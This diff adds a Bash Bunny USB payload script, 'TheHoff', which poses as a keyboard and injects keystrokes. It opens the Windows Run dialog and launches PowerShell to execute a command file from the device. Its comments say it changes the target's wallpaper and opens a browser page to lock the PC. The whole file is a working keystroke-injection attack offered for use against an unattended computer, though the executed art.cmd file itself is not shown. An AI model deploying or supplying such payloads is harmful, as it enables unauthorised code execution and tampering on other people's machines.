@@ -1,0 +1,37 @@
+#!/bin/bash
+#
+# Title:         TheHoff
+# Author:        TripleZoom
+# Version:       1.0
+#
+#  This runs any valid ducky code from the ducky_code.txt file then completes.
+# Changes Background to Hoff and sends to IE Page to lock PC
+#
+#
+# G 1000 Payload Running
+# G B 0 Payload Completed
+
+# Source bunny_helpers.sh for functions & variables see Useful Commands and Syntax for more details
+source bunny_helpers.sh
+
+# Set attack modes
+ATTACKMODE HID STORAGE
+
+# Payload scripts start after this line
+LED G 1000
+
+# Check this is the correct language for your HOST.
+SET_LANGUAGE us
+DUCKY_LANG us
+
+# No need to edit here just change the ducky script in the DUCKY_CODE.txt
+QUACK switch2/duckycode.txt
+QUACK GUI r
+QUACK DELAY 2000
+QUACK STRING powershell -noexit ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\art.cmd')"
+QUACK ENTER
+
+
+
+# This indicates your script has finished
+LED G B 0
